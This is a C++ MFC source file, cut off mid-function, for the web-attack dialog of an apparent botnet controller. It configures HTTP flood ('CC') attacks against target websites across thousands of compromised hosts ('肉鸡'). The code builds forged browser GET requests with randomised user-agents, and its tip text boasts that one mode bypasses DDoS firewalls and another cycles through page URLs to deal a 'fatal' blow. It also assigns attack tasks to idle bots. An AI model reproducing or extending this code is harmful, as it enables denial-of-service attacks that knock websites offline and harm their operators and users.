// WebAttackDlg.cpp : implementation file

#include "stdafx.h"
#include "Quick.h"
#include "WebAttackDlg.h"
#include "DDOSAttackDlg.h"



#ifdef _DEBUG
#define new DEBUG_NEW
#endif

/////////////////////////////////////////////////////////////////////////////
// CWebAttackDlg dialog
IMPLEMENT_DYNAMIC(CWebAttackDlg, CDialog)

CWebAttackDlg::CWebAttackDlg(CWnd* pParent /*=NULL*/)
	: CDialog(CWebAttackDlg::IDD, pParent)
{
	//{{AFX_DATA_INIT(CWebAttackDlg)
		// NOTE: the ClassWizard will add member initialization here

	m_SelectHost = FALSE;
	m_HostNums = 200;
	m_EndVar = 1000;
	m_Port = 80;
	m_AttckTims = 60;
	m_StartVar = 1;
	m_TargetWeb = _T("http://www.baidu.com");
	m_ThreadNums = 10;
	m_TipShow = _T("");
	//}}AFX_DATA_INIT
	TaskID = 0;
	Point = NULL;

	clr = RGB(0, 0, 0);
	m_brush.CreateSolidBrush(clr);
}


void CWebAttackDlg::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CWebAttackDlg)
		// NOTE: the ClassWizard will add DDX and DDV calls here
	DDX_Control(pDX, IDC_TARGET_WEB, m_TargetCtrl);
	DDX_Control(pDX, IDC_SLIDER_TIME, m_TimeCtrl);
	DDX_Control(pDX, IDC_SLIDER_THREAD, m_ThreadCtrl);
	DDX_Control(pDX, IDC_SPIN_NUM, m_HotsNumCtrl);
	DDX_Control(pDX, IDC_COMBO_MODEL, m_ModelList);
	DDX_Control(pDX, IDC_LIST_TARGET, m_TargetList);
	DDX_Check(pDX, IDC_SELECTHOST, m_SelectHost);
	DDX_Text(pDX, IDC_HOSTNUMS, m_HostNums);
	DDV_MinMaxUInt(pDX, m_HostNums, 1, 20000);
	DDX_Text(pDX, IDC_ENDVAR, m_EndVar);
	DDV_MinMaxUInt(pDX, m_EndVar, 2, 100000);
	DDX_Text(pDX, IDC_ATTCKPORT, m_Port);
	DDV_MinMaxUInt(pDX, m_Port, 1, 65535);
	DDX_Text(pDX, IDC_ATTACKTIMES, m_AttckTims);
	DDX_Text(pDX, IDC_STARTVAR, m_StartVar);
	DDV_MinMaxUInt(pDX, m_StartVar, 1, 100000);
	DDX_Text(pDX, IDC_TARGET_WEB, m_TargetWeb);
	DDV_MaxChars(pDX, m_TargetWeb, 300);
	DDX_Text(pDX, IDC_THREADNUMS, m_ThreadNums);
	DDV_MinMaxDWord(pDX, m_ThreadNums, 1, 100);
	DDX_Text(pDX, IDC_STATIC_TIP, m_TipShow);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CWebAttackDlg, CDialog)
	//{{AFX_MSG_MAP(CWebAttackDlg)
	ON_BN_CLICKED(IDC_ADDTASK, OnAddtask)
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_SLIDER_TIME, OnCustomdrawSliderTime)
	ON_NOTIFY(NM_CUSTOMDRAW, IDC_SLIDER_THREAD, OnCustomdrawSliderThread)
	ON_NOTIFY(NM_RCLICK, IDC_LIST_TARGET, OnRclickListTarget)
	ON_WM_CTLCOLOR()
	ON_CBN_SELCHANGE(IDC_COMBO_MODEL, OnSelchangeComboModel)
	ON_EN_CHANGE(IDC_TARGET_WEB, OnChangeTargetWeb)
	ON_EN_SETFOCUS(IDC_STARTVAR, OnSetfocusStartvar)
	ON_EN_SETFOCUS(IDC_TARGET_WEB, OnSetfocusTargetWeb)
	ON_CBN_SETFOCUS(IDC_COMBO_MODEL, OnSetfocusComboModel)
	ON_EN_SETFOCUS(IDC_THREADNUMS, OnSetfocusThreadnums)
	ON_EN_CHANGE(IDC_THREADNUMS, OnChangeThreadnums)
	ON_EN_CHANGE(IDC_ATTACKTIMES, OnChangeAttacktimes)
	ON_EN_SETFOCUS(IDC_ATTACKTIMES, OnSetfocusAttacktimes)
	ON_EN_CHANGE(IDC_ATTCKPORT, OnChangeAttckport)
	ON_EN_SETFOCUS(IDC_ATTCKPORT, OnSetfocusAttckport)
	ON_EN_CHANGE(IDC_HOSTNUMS, OnChangeHostnums)
	ON_EN_SETFOCUS(IDC_HOSTNUMS, OnSetfocusHostnums)
	ON_EN_CHANGE(IDC_STARTVAR, OnChangeStartvar)
	ON_EN_CHANGE(IDC_ENDVAR, OnChangeEndvar)
	ON_EN_SETFOCUS(IDC_ENDVAR, OnSetfocusEndvar)
	ON_BN_CLICKED(IDC_SELECTHOST, OnSelecthost)
	ON_BN_CLICKED(IDC_NEWAUTO, OnNewauto)
	ON_WM_SIZE()
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()
//
BEGIN_EASYSIZE_MAP(CWebAttackDlg)
	//EASYSIZE(control,left,top,right,bottom,options)
	//ES_BORDER表示控件与对话框边界（以下简称边界）的距离；
	//ES_KEEPSIZE表示控件水平/垂直方向上尺寸保持不变；
	//控件ID值表示当前控件与指定控件之间的距离；
	//ES_HCENTER表示缩放后控件在指定位置内水平居中；
	//ES_VCENTER表示缩放后控件在指定位置内垂直居中；
	EASYSIZE(IDC_STATIC_1, ES_BORDER, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_STATIC_TIP, ES_BORDER, ES_KEEPSIZE, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_LIST_TARGET, ES_BORDER, ES_BORDER, ES_BORDER, ES_BORDER, 0)
	EASYSIZE(IDC_TARGET_WEB, ES_BORDER, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_COMBO_MODEL, ES_BORDER, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_ATTCKPORT, ES_BORDER, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_HOSTNUMS, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_SPIN_NUM, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_STATIC_6, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_STATIC_7, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_STATIC_8, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_SLIDER_THREAD, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_SLIDER_TIME, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_SELECTHOST, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_THREADNUMS, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_ATTACKTIMES, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_STATIC_9, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_STATIC_10, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_STATIC_11, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_STARTVAR, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_ENDVAR, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
	EASYSIZE(IDC_ADDTASK, ES_KEEPSIZE, ES_BORDER, ES_BORDER, ES_KEEPSIZE, 0)
END_EASYSIZE_MAP

/////////////////////////////////////////////////////////////////////////////
// CWebAttackDlg message handlers

WORD CWebAttackDlg::GetPortNum(LPWSTR szUrl, WORD iPort, LPWSTR URL)
{
	
	CString Str = szUrl;
	Str.MakeLower();
	lstrcpy(szUrl, Str.GetBuffer(0));


	TCHAR* Test = _tcsstr(szUrl, _T(".gov"));
	if (Test != NULL)
		return 0;

	TCHAR* Point = _tcsstr(szUrl, _T("http://"));

	if (Point != NULL)
		Point += 7;
	else
		Point = szUrl;

	TCHAR* Temp = _tcsstr(Point, _T(":"));

	TCHAR TempBuffer[400] = { NULL };

	//如果地址不包含端口 并且iPort 不等于80 则在URL地址添加端口.
	if (Temp == NULL)
	{
		if (iPort != 80)
		{
			Test = _tcsstr(Point, _T("/"));
			if (Test == NULL)
				wsprintf(URL, _T("http://%s:%u"), Point, iPort);
			else
			{
				_tcsnccpy_s(TempBuffer, Point, lstrlen(Point) - lstrlen(Test));
				wsprintf(URL, _T("http://%s:%u%s"), TempBuffer, iPort, Test);
			}

		}
		else
			wsprintf(URL, _T("http://%s"), Point);
		return iPort;
	}
	else//如果地址包含端口 则返回地址中的端口! 忽略iPort 参数.
	{
		Test = _tcsstr(Point, _T("/"));
		wsprintf(URL, _T("http://%s"), Point);
		return _tstoi(++Temp);
	}
}

WORD CWebAttackDlg::ForMatFlowAddr(LPWSTR szAddr, WORD iPort)
{
	TCHAR* Point = _tcsstr(szAddr, _T("http://"));
	if (Point)
		Point += 7;
	else
		Point = szAddr;

	TCHAR Addr[400] = { NULL };
	lstrcpy(Addr, Point);

	Point = Addr;
	TCHAR* Temp = _tcsstr(Addr, _T("/"));
	if (Temp)
		*Temp = _T('\0');

	TCHAR* Port = _tcsstr(Point, _T(":"));

	if (Port)
	{
		*Port = _T('\0');
		Port++;
		lstrcpy(szAddr, Addr);
		return _tstoi(Port);
	}

	lstrcpy(szAddr, Addr);
	return iPort;
}


void CWebAttackDlg::OnAddtask()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);

	//过滤掉一些特殊的字符....
	if (m_Port < 0 || m_Port >65535)
	{
		MessageBox(_T("端口错误!"));
		return;
	}
	if (m_TargetWeb.GetLength() <= 0 || m_TargetWeb.GetLength() > 400)
	{
		MessageBox(_T("目标错误!"));
		return;
	}
	//这里直接把参数过滤掉...
	CString Temp;

	GetDlgItemText(IDC_COMBO_MODEL, Temp);
	if (Temp == _T("网站: 轮回CC"))
	{
		if (m_TargetWeb.Find(_T("%d")) == -1)
		{
			MessageBox(_T("轮回CC目标地址必须包含 %d 通配符!"), _T("添加失败!"));
			return;
		}
	}

	if (Temp == _T("网站: 变异CC") || Temp == _T("网站: 模拟 IE") || Temp == _T("网站: 轮回CC"))
	{
		TCHAR TempStr[400] = { NULL };
		WORD iPort = GetPortNum(m_TargetWeb.GetBuffer(0), m_Port, TempStr);
		if (iPort == 0)
		{
			MessageBox(_T("地址包含不合法信息!"));
			return;
		}
		m_Port = iPort;
		m_TargetWeb.Format(_T("%s"), TempStr);
	}
	else
	{
		m_Port = ForMatFlowAddr(m_TargetWeb.GetBuffer(0), m_Port);
	}


	WORD iCount = m_TargetList.GetItemCount();

	m_TargetList.InsertItem(iCount, _T(""), TRUE);

	m_TargetList.SetItemText(iCount, 0, m_TargetWeb);

	Temp.Format(_T("%d"), m_Port);
	m_TargetList.SetItemText(iCount, 1, Temp);


	//主机数量 如果选择的是已经选中主机
	if (m_SelectHost)
		Temp = _T("选中主机");
	else
		Temp.Format(_T("%d"), m_HostNums);
	m_TargetList.SetItemText(iCount, 2, Temp);


	Temp.Format(_T("%d"), m_ThreadNums);
	m_TargetList.SetItemText(iCount, 3, Temp);

	Temp.Format(_T("%d"), m_AttckTims);
	m_TargetList.SetItemText(iCount, 4, Temp);

	GetDlgItemText(IDC_COMBO_MODEL, Temp);
	m_TargetList.SetItemText(iCount, 5, Temp);

	if (Temp == _T("网站: 轮回CC"))
		Temp.Format(_T("%d-%d"), m_StartVar, m_EndVar);
	else
		Temp = _T("不支持");

	m_TargetList.SetItemText(iCount, 6, Temp);



	m_TargetList.SetItemText(iCount, 7, _T("空闲"));

	Temp.Format(_T("%d"), TaskID++);

	m_TargetList.SetItemText(iCount, 8, Temp);

}



BOOL CWebAttackDlg::OnInitDialog()
{
	CDialog::OnInitDialog();

	// TODO: Add extra initialization here
	m_HotsNumCtrl.SetRange(1, 20000);
	m_HotsNumCtrl.SetPos(200);
	m_HotsNumCtrl.SetBuddy(GetDlgItem(IDC_HOSTNUMS));

	m_TimeCtrl.SetRange(1, 600);
	m_TimeCtrl.SetPos(60);

	m_ThreadCtrl.SetRange(1, 100);
	m_ThreadCtrl.SetPos(10);

	LONG lStyle;
	lStyle = GetWindowLong(m_TargetList.m_hWnd, GWL_STYLE);
	lStyle &= ~LVS_TYPEMASK;
	lStyle |= LVS_REPORT;
	SetWindowLong(m_TargetList.m_hWnd, GWL_STYLE, lStyle);
	SetWindowLong(m_TargetList.m_hWnd, GWL_STYLE, lStyle);

	DWORD dwStyle = m_TargetList.GetExtendedStyle();
	dwStyle |= LVS_EX_FULLROWSELECT;
	dwStyle |= LVS_EX_GRIDLINES;

	m_TargetList.SetExtendedStyle(dwStyle);


	m_TargetList.InsertColumn(0, _T("网址(目标)"), LVCFMT_LEFT, 140);
	m_TargetList.InsertColumn(1, _T("目标端口"), LVCFMT_LEFT, 65);
	m_TargetList.InsertColumn(2, _T("主机数量"), LVCFMT_LEFT, 65);
	m_TargetList.InsertColumn(3, _T("线程数量"), LVCFMT_LEFT, 65);
	m_TargetList.InsertColumn(4, _T("持续时间"), LVCFMT_LEFT, 65);
	m_TargetList.InsertColumn(5, _T("模式"), LVCFMT_LEFT, 90);
	m_TargetList.InsertColumn(6, _T("轮回CC参数"), LVCFMT_LEFT, 78);
	m_TargetList.InsertColumn(7, _T("状态"), LVCFMT_LEFT, 60);
	m_TargetList.InsertColumn(8, _T("任务ID"), LVCFMT_LEFT, 60);
	m_ModelList.SetCurSel(0);

	GetDlgItem(IDC_STARTVAR)->EnableWindow(FALSE);
	GetDlgItem(IDC_ENDVAR)->EnableWindow(FALSE);

	INIT_EASYSIZE;
	return TRUE;  // return TRUE unless you set the focus to a control
				  // EXCEPTION: OCX Property Pages should return FALSE
}

void CWebAttackDlg::OnCustomdrawSliderTime(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	m_AttckTims = m_TimeCtrl.GetPos();
	m_TipShow = _T("时间分配非常重要 如控制端突然断网,或者停电,异常,以及主机宽带耗尽,致无法上线,无法接收停止命令\r\n")
		_T("那么这将是很可怕的事.分配好持续时间,服务端将在持续时间计时完后自行停止!.");
	SetDlgItemInt(IDC_ATTACKTIMES, m_AttckTims);
	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);

	*pResult = 0;
}

void CWebAttackDlg::OnChangeAttacktimes()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	m_TipShow = _T("时间分配非常重要 如控制端突然断网,或者停电,异常,以及主机宽带耗尽,致无法上线,无法接收停止命令\r\n")
		_T("那么这将是很可怕的事.分配好持续时间,服务端将在持续时间计时完后自行停止!.单位为分钟!");
	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}

void CWebAttackDlg::OnSetfocusAttacktimes()
{
	// TODO: Add your control notification handler code here
	m_TipShow = _T("时间分配非常重要 如控制端突然断网,或者停电,异常,以及主机宽带耗尽,致无法上线,无法接收停止命令\r\n")
		_T("那么这将是很可怕的事.分配好持续时间,服务端将在持续时间计时完后自行停止!.单位为分钟");
	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}

VOID CWebAttackDlg::ShowThreads()
{
	if (m_ThreadNums <= 20)
		m_TipShow = _T("线程一般,主机CPU占用20%左右,宽带占用60%上下,不容易造成主机掉线");
	if (m_ThreadNums > 20 && m_ThreadNums < 40)
		m_TipShow = _T("线程过高,主机CPU占用50%左右,宽带占用80%上下,容易造成主机宽带耗尽,并且掉线");
	if (m_ThreadNums > 40 && m_ThreadNums < 100)
		m_TipShow = _T("线程过高,主机CPU占用80%以上,宽带耗尽,比如无法接收停止命令,并且极易造成主机掉线,死机,请酌情考虑!");

	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}


void CWebAttackDlg::OnCustomdrawSliderThread(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	m_ThreadNums = m_ThreadCtrl.GetPos();
	ShowThreads();
	SetDlgItemInt(IDC_THREADNUMS, m_ThreadNums);

	*pResult = 0;
}
void CWebAttackDlg::OnSetfocusThreadnums()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowThreads();
}

void CWebAttackDlg::OnChangeThreadnums()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowThreads();
}
void CWebAttackDlg::OnRclickListTarget(NMHDR* pNMHDR, LRESULT* pResult)
{
	// TODO: Add your control notification handler code here
	CMenu m_ListMenu;
	VERIFY(m_ListMenu.CreatePopupMenu());
	m_ListMenu.AppendMenu(MF_STRING | MF_ENABLED, 50, _T("开始"));
	m_ListMenu.AppendMenu(MF_STRING | MF_ENABLED, 100, _T("停止"));
	m_ListMenu.AppendMenu(MF_STRING | MF_ENABLED, 150, _T("删除"));
	m_ListMenu.AppendMenu(MF_SEPARATOR, NULL);
	CPoint p;
	GetCursorPos(&p);

	//CMenu* Temp = m_ListMenu.GetSubMenu(0);

	for (int i = 0; i < m_TargetList.GetItemCount(); i++)
	{
		if (LVIS_SELECTED == m_TargetList.GetItemState(i, LVIS_SELECTED))
		{
			CString str = m_TargetList.GetItemText(i, 8);
			if (str == _T("攻击中"))
			{
				m_ListMenu.EnableMenuItem(0, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
				m_ListMenu.EnableMenuItem(2, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
			}
			else
			{
				m_ListMenu.EnableMenuItem(1, MF_BYPOSITION | MF_DISABLED | MF_GRAYED);
			}
		}
	}

	int nMenuResult = CXTPCommandBars::TrackPopupMenu(&m_ListMenu, TPM_LEFTALIGN | TPM_RIGHTBUTTON | TPM_RETURNCMD, p.x, p.y, this, NULL);
	if (!nMenuResult) 	return;
	switch (nMenuResult)
	{
	case 50:
	{
		OnStart();
	}
	break;
	case 100:
	{
		OnStop();
	}
	break;
	case 150:
	{
		OnDeleteList();
	}
	break;
	default:
		break;
	}


	m_ListMenu.DestroyMenu();

	*pResult = 0;
}


HBRUSH CWebAttackDlg::OnCtlColor(CDC* pDC, CWnd* pWnd, UINT nCtlColor)
{
	if ((pWnd->GetDlgCtrlID() == IDC_STATIC_TIP) && (nCtlColor == CTLCOLOR_EDIT))
	{
		 clr = RGB(0, 255, 0);
		pDC->SetTextColor(clr);   //设置白色的文本
		CFont font;
		font.CreatePointFont(90, _T("宋体"));
		CFont* pOldFont = pDC->SelectObject(&font);
		clr = RGB(0, 0, 0);
		pDC->SetBkColor(clr);     //设置黑色的背景
		font.DeleteObject();
		pDC->SelectObject(pOldFont);
		return m_brush;  //作为约定，返回背景色对应的刷子句柄
	}
	else
	{
		return CDialog::OnCtlColor(pDC, pWnd, nCtlColor);
	}
}

void CWebAttackDlg::OnSelchangeComboModel()
{
	// TODO: Add your control notification handler code here
	CString temp;
	GetDlgItemText(IDC_COMBO_MODEL, temp);

	if (temp == _T("网站: 变异CC"))
		m_TipShow = _T("变异CC 可以有效的测试网站的并发连接数量,以及后台数据库的吞吐量,能够有效的测试WEB网站所能承受的压力!\r\n");
	if (temp == _T("网站: 模拟 IE"))
		m_TipShow = _T("模拟IE模式 将完全模拟IE浏览器发送的HTTP请求,包含Cookie.能够有效的突破部分DDOS防火墙!\r\n");

	GetDlgItem(IDC_STARTVAR)->EnableWindow(FALSE);
	GetDlgItem(IDC_ENDVAR)->EnableWindow(FALSE);

	if (temp == _T("网站: 轮回CC"))
	{
		m_TipShow = _T("某些页面有一定的规律 比如 bbs.xxxx.com/%d.php 这里的%d 就是轮回CC参数 比如起始为:1 结束为:10\r\n")
			_T("那么肉鸡将会从 bbs.xxxx.com/1.php 一直请求到 bbs.xxxx.com/10.php 一共请求10个页面 对WEB网站造成致命的攻击");
		GetDlgItem(IDC_STARTVAR)->EnableWindow(TRUE);
		GetDlgItem(IDC_ENDVAR)->EnableWindow(TRUE);
	}
	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}

void CWebAttackDlg::OnSetfocusComboModel()
{
	// TODO: Add your control notification handler code here
	CString temp = _T("正确的模式 对症下药 以最小的主机 最低的线程 发挥出最大的威力!");
	SetDlgItemText(IDC_STATIC_TIP, temp);
}

void CWebAttackDlg::OnChangeTargetWeb()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	CString temp = _T("目标请务必填写正确，如果目标是网站，目标必须保证在浏览器里面可以打开!\r\n")
		_T("如果选择的是TCP模式,可以切换到生成服务端窗口,有简单的测试连接工具!其他模式无法测试 须自行判断!");
	SetDlgItemText(IDC_STATIC_TIP, temp);

}

void CWebAttackDlg::OnSetfocusTargetWeb()
{
	// TODO: Add your control notification handler code here
	CString temp = _T("目标请务必填写正确，如果目标是网站，目标必须保证在浏览器里面可以打开!\r\n")
		_T("如果选择的是TCP模式,可以切换到生成服务端窗口,有简单的测试连接工具!其他模式无法测试 须自行判断!");
	SetDlgItemText(IDC_STATIC_TIP, temp);
}

void CWebAttackDlg::OnChangeAttckport()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	m_TipShow = _T("端口一定要正确,正确的端口才能给目标致命的打击!一般网站端口为80");
	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}

void CWebAttackDlg::OnSetfocusAttckport()
{
	// TODO: Add your control notification handler code here
	m_TipShow = _T("端口一定要正确,正确的端口才能给目标致命的打击!一般网站端口为80");
	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}

void CWebAttackDlg::OnChangeHostnums()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	m_TipShow = _T("合理的分配主机 才能实现多目标攻击 发送攻击时 会跳过已经在攻击中的主机!\r\n")
		_T("只有空闲主机才接收命令 请自行计算! 详细请看 在线主机->DDOS状态.");

	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}

void CWebAttackDlg::OnSetfocusHostnums()
{
	// TODO: Add your control notification handler code here
	m_TipShow = _T("合理的分配主机 才能实现多目标攻击 发送攻击时 会跳过已经在攻击中的主机!\r\n")
		_T("只有空闲主机才接收命令 请自行计算! 详细请看 在线主机->DDOS状态.");
	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}

VOID CWebAttackDlg::ShowPageNums()
{
	if (m_StartVar >= m_EndVar)
	{
		m_TipShow = _T("起始参数 大于 结束参数 错误!");
		SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
		return;
	}

	if (m_TargetWeb.Find(_T("%d")) == -1)
		m_TipShow = _T("目标错误 没有找到 %d 通配符!!请重新填写目标!");
	else
	{
		TCHAR Buffer[400] = { NULL };
		ZeroMemory(Buffer, sizeof(Buffer));
		GetDlgItemText(IDC_TARGET_WEB, Buffer, sizeof(Buffer));

		TCHAR* Point;
		Point = _tcsstr(Buffer, _T("%d"));
		if (Point == NULL)
			return;

		TCHAR TempHead[300] = _T("");
		ZeroMemory(TempHead, sizeof(TempHead));

		_tcsnccpy_s(TempHead, Buffer, lstrlen(Buffer) - lstrlen(Point));
		//跳过%d...
		Point += 2;

		m_TipShow.Format(_T("目标正确 %s%d%s -- %s%d%s 共计%d个页面"),
			TempHead, m_StartVar, Point, TempHead, m_EndVar, Point, (m_EndVar - m_StartVar) + 1);
	}
	SetDlgItemText(IDC_STATIC_TIP, m_TipShow);
}

void CWebAttackDlg::OnSetfocusStartvar()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowPageNums();

}
void CWebAttackDlg::OnSetfocusEndvar()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowPageNums();
}

void CWebAttackDlg::OnChangeStartvar()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowPageNums();

}


void CWebAttackDlg::OnChangeEndvar()
{
	// TODO: If this is a RICHEDIT control, the control will not
	// send this notification unless you override the CDialog::OnInitDialog()
	// function and call CRichEditCtrl().SetEventMask()
	// with the ENM_CHANGE flag ORed into the mask.

	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	ShowPageNums();
}

void CWebAttackDlg::OnSelecthost()
{
	// TODO: Add your control notification handler code here
	UpdateData(TRUE);
	if (m_SelectHost)
	{
		GetDlgItem(IDC_HOSTNUMS)->EnableWindow(FALSE);
		GetDlgItem(IDC_SPIN_NUM)->EnableWindow(FALSE);
	}
	else
	{
		GetDlgItem(IDC_HOSTNUMS)->EnableWindow(TRUE);
		GetDlgItem(IDC_SPIN_NUM)->EnableWindow(TRUE);
	}

}

void CWebAttackDlg::OnNewauto()
{
	// TODO: Add your control notification handler code here

}


void CWebAttackDlg::OnSize(UINT nType, int cx, int cy)
{
	CDialog::OnSize(nType, cx, cy);
	UPDATE_EASYSIZE;
}

DWORD CreateRandNum(WORD Min = 0, WORD Max = 0)
{
	SYSTEMTIME st;
	GetLocalTime(&st);
	if (Min == 0 && Max == 0)
		return GetTickCount() + st.wMinute + st.wSecond;
	else
		return (GetTickCount() + st.wMinute + st.wSecond) % ((Max - Min) + 1) + Min;
}


BOOL CWebAttackDlg::FilterCCString(LPWSTR szUrl, ATTACK& m_Attack, WORD& rPort)
{
	if (szUrl == NULL)
		return FALSE;
	if (_tcsstr(szUrl, _T("gov")))
		return FALSE;

	//strlwr(szUrl);
	CString szTemp = szUrl;
	szTemp.MakeLower();
	lstrcpy(szUrl, szTemp.GetBuffer(0));

	//查看是否有http://
	TCHAR* Point = _tcsstr(szUrl, _T("http://"));
	if (Point)
		Point += 7;//跳过http://
	else
		Point = szUrl;

	TCHAR DNS[200] = { NULL };

	TCHAR* Port = _tcsstr(Point, _T(":"));
	TCHAR* Temp = NULL;
	WORD iPort = 80;
	TCHAR* Page = _T("");

	if (Port)//说明地址包含端口 分离
	{
		_tcsnccpy_s(DNS, Point, lstrlen(Point) - lstrlen(Port));
		//获取端口
		Port++;
		Temp = _tcsstr(Port, _T("/"));
		if (Temp == NULL)
		{
			if (lstrlen(Port) > 5)
			{
				MessageBox(_T("地址错误 无法识别!"));
				return FALSE;
			}
			else
				iPort = _tstoi(Port);
		}
		else
		{
			TCHAR strPort[6] = { NULL };
			_tcsnccpy_s(strPort, Port, lstrlen(Port) - lstrlen(Temp));
			iPort = _tstoi(strPort);
			//分离页面
			Page = Port;
			Page += lstrlen(strPort);
			Page++;
		}
	}
	else//地址未包含端口...
	{
		Temp = _tcsstr(Point, _T("/"));
		if (Temp == NULL)//说明直接是域名了...
		{
			lstrcpy(DNS, Point);
		}
		else
		{
			_tcsnccpy_s(DNS, Point, lstrlen(Point) - lstrlen(Temp));
			Temp++;
			Page = Temp;
		}
	}

	lstrcpy(m_Attack.Target, DNS);

	if (iPort != 80)
		wsprintf(DNS, _T("%s:%u"), DNS, iPort);

	//构造完整CC 请求包.
	TCHAR SendBuffer[] =
		_T("GET /%s HTTP/1.1\r\n")
		_T("Accept: application/x-shockwave-flash, image/gif, ")
		_T("image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, ")
		_T("application/vnd.ms-powerpoint, application/msword, application/xaml+xml, ")
		_T("application/x-ms-xbap, application/x-ms-application, application/QVOD, application/QVOD, */*\r\n")
		_T("Accept-Language: zh-cn\r\n")
		_T("Accept-Encoding: gzip, deflate\r\n")
		_T("User-Agent: Mozilla/4.0 (compatible; MSIE %u.0; Windows NT %u.1; SV1; .NET4.0C; .NET4.0E; TheWorld)\r\n")
		_T("Host: %s\r\n")
		_T("Connection: Keep-Alive\r\n")
		_T("\r\n")
		_T("\r\n");
	
	CString W;
	CStringA A;
	TCHAR SendData[2000]; //发送的数据包
	wsprintf(SendData, SendBuffer, Page, CreateRandNum(5, 9), CreateRandNum(2, 6), DNS);
	W = SendData;
	A = W;
	memcpy(m_Attack.SendData, A.GetBuffer(), A.GetLength() * sizeof(TCHAR));
	m_Attack.AttackPort = iPort;


	return TRUE;
}

void CWebAttackDlg::OnStart()
{
	// TODO: Add your command handler code here
	for (int i = 0; i < m_TargetList.GetItemCount(); i++)
	{
		if (LVIS_SELECTED == m_TargetList.GetItemState(i, LVIS_SELECTED))
		{
			CString str = m_TargetList.GetItemText(i, 8);
			if (str == _T("攻击中"))
			{
				MessageBox(_T("报告 目标已经攻击中!"), _T("提示"), MB_OK | MB_ICONINFORMATION);
				return;
			}
			else
			{
				//获取攻击结构体...
				ATTACK m_Attack;
				ZeroMemory(&m_Attack, sizeof(ATTACK));
				//获取目标
				m_TargetList.GetItemText(i, 0, m_Attack.Target, sizeof(m_Attack.Target));

